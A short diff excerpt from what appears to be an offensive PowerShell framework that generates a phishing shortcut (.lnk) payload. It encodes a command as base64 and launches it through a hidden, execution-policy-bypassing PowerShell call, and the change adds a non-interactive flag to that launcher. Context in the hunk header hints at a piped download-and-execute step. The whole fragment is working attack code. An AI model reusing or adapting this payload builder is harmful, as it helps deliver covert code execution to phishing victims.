@@ -679,7 +679,7 @@ primer | iex }'
     Write-Host -Object "Phishing .lnk Payload written to: $global:newdir\PhishingAttack-Link.lnk"  -ForegroundColor Green
 
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-    $payloadraw = 'powershell -exec bypass -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
 
     
